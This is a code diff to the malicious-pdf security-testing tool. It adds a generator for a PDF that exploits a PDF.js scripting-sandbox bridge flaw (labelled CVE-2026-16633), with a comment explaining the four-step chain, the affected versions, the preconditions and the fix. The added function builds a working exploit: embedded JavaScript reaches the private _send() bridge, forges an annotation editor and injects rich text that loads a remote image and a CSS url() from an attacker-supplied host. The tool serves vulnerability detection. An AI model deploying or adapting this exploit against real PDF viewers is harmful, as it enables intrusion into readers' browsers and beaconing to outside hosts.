@@ -136,7 +136,10 @@ def _obfuscate_js_payload_b64(js_bytes):
 
 # Heuristic: substrings that indicate a JS payload targets PDF.js / browser APIs
 # rather than Acrobat. Used by Level 4 to pick the right wrapper.
-_BROWSER_API_HINTS = (b'fetch(', b'XMLHttpRequest', b'new Image', b'WebSocket')
+_BROWSER_API_HINTS = (b'fetch(', b'XMLHttpRequest', b'new Image', b'WebSocket',
+                      # test49 drives the PDF.js viewer directly, so it needs
+                      # the charcode wrapper too: PDF.js has no util.streamFromString.
+                      b'pdfjs_internal_editor_')
 
 
 def _rewrite_js_blocks(data, transform):
@@ -4178,6 +4181,100 @@ trailer <<
 >>''')
 
 
+# CVE-2026-16633: PDF.js scripting-sandbox bridge accepts a forged editor
+# Affects pdfjs-dist >= 5.6.205 (the GitHub advisory says 5.6.83; the reporter
+# traces the chain to commit 04272de, first shipped in 5.6.205) < 6.2.108.
+#
+# Chain, all four steps confirmed against pdfjs-dist 6.1.200:
+#  1. ProxyHandler.get() in src/scripting_api/proxy.js allows any property not
+#     starting with "_" and binds functions to the *raw* target. valueOf is
+#     inherited from Object.prototype, so field.valueOf() hands back the raw
+#     Field, whose private _send() is the sandbox -> viewer bridge.
+#  2. PDFScriptingManager did not check the message's element id. An id that
+#     matches no rendered annotation falls through to
+#     annotationStorage.setValue(), so arbitrary attacker data is stored.
+#  3. AnnotationEditorUIManager.findClonesForPage(), called from
+#     AnnotationEditorLayer.render(), picks up any stored entry whose
+#     pageIndex matches and isClone is set, and deserializes it into a real
+#     editor. Ink is used here rather than FreeText because FreeTextEditor
+#     .isEmpty() reads editorDiv.innerText, which is still blank when the
+#     layer culls empty editors, so a forged FreeText is removed again.
+#     Ink survives with a two-point path. Points are 4-element arrays so the
+#     len > 4 branch (which calls .subarray) is never reached -- JSON cannot
+#     carry the Float32Array it expects.
+#  4. The editor's comment richText is rendered by renderRichText() ->
+#     XfaLayer.render() with intent "richText", which pre-fix created elements
+#     and assigned styles with no allowlist.
+#
+# This payload is a detection probe: the forged rich text fetches a remote
+# resource (an <img> and a CSS url()) and stops there. 6.2.108 blocks both --
+# it adds the id allowlist in step 2, and in step 4 restricts rich text to a
+# small element set, drops on* attributes and rejects url( in styles.
+#
+# Preconditions: enableScripting (the default), the comment feature enabled
+# (enableComment, false in the stock dist build but on in Firefox release),
+# and no CSP restricting img-src. Firefox >= 153 is unaffected: its own CSP
+# change (Mozilla bug 1960363) blocks the fetch. Note that under a CSP the
+# forged DOM is still built -- only the outbound request is stopped.
+#
+# Trigger: the reader opens the forged comment on the last page.
+def create_malpdf49(filename, host):
+    marker = 'pdfjs-bridge-probe'
+    rich = (
+        '{name:"div",attributes:{style:{background:"url(' + host
+        + '/test49-style)"}},children:[{name:"img",attributes:{src:"'
+        + host + '/test49-img"},children:[]}]}'
+    )
+    js = (
+        'try{'
+        'var raw=this.getField("bridge").valueOf();'
+        'raw._send({id:"pdfjs_internal_editor_49001",annotationType:15,'
+        'pageIndex:3,isClone:true,popupRef:true,rect:[50,650,350,750],'
+        'rotation:0,thickness:3,opacity:1,color:[255,0,0],'
+        'paths:{points:[[60,700,300,700]]},'
+        'comment:"' + marker + '",'
+        'richText:{str:"' + marker + '",html:' + rich + '}'
+        '});'
+        '}catch(e){}'
+        'this.pageNum=3;'
+    )
+
+    content = 'BT /F1 14 Tf 40 780 Td (Testcase: CVE-2026-16633) Tj ET'
+    objs = [
+        '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [9 0 R] >> '
+        '/OpenAction 7 0 R >>',
+        '<< /Type /Pages /Kids [3 0 R 4 0 R 5 0 R 6 0 R] /Count 4 '
+        '/MediaBox [0 0 595 842] >>',
+    ]
+    for i in range(4):
+        annots = ' /Annots [9 0 R]' if i == 0 else ''
+        objs.append(
+            '<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 '
+            '<< /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> '
+            '/Contents 8 0 R' + annots + ' >>'
+        )
+    objs.append('<< /Type /Action /S /JavaScript /JS (' + js + ') >>')
+    objs.append('<< /Length ' + str(len(content)) + ' >>\nstream\n'
+                + content + '\nendstream')
+    objs.append('<< /Type /Annot /Subtype /Widget /Rect [100 100 300 130] '
+                '/FT /Tx /T (bridge) /V () >>')
+
+    out = '%PDF-1.7\n'
+    offsets = []
+    for num, body in enumerate(objs, start=1):
+        offsets.append(len(out))
+        out += '%d 0 obj\n%s\nendobj\n\n' % (num, body)
+    xref_at = len(out)
+    out += 'xref\n0 %d\n0000000000 65535 f \n' % (len(objs) + 1)
+    for off in offsets:
+        out += '%010d 00000 n \n' % off
+    out += ('trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n'
+            % (len(objs) + 1, xref_at))
+
+    with open(filename, 'w') as file:
+        file.write(out)
+
+
 _PDF_COMMENT = b'% Generated by malicious-pdf - https://github.com/jonaslejon/malicious-pdf\n'
 _PDF_INFO = b' /Info << /Creator (malicious-pdf) /Producer (https://github.com/jonaslejon/malicious-pdf) >>'
 _FOOTER_LABEL = b'Generated by malicious-pdf - https://github.com/jonaslejon/malicious-pdf'
@@ -4340,6 +4437,7 @@ def main():
         46: "CVE-2026-25755 - jsPDF addJS() object injection + /AA /O auto-action",
         47: "PDF 2.0 /AF Associated Files with embedded HTML/JS",
         48: "XFA SOAP submit with initialize event (Acrobat XFA engine)",
+        49: "CVE-2026-16633 - forged editor via scripting-sandbox bridge (PDF.js)",
     }
 
     pdf_generators = {
@@ -4414,6 +4512,7 @@ def main():
         46: (create_malpdf46, ensure_scheme(host)),
         47: (create_malpdf47, ensure_scheme(host)),
         48: (create_malpdf48, ensure_scheme(host)),
+        49: (create_malpdf49, ensure_scheme(host)),
     }
 
     file_extensions = {14: '.svg'}
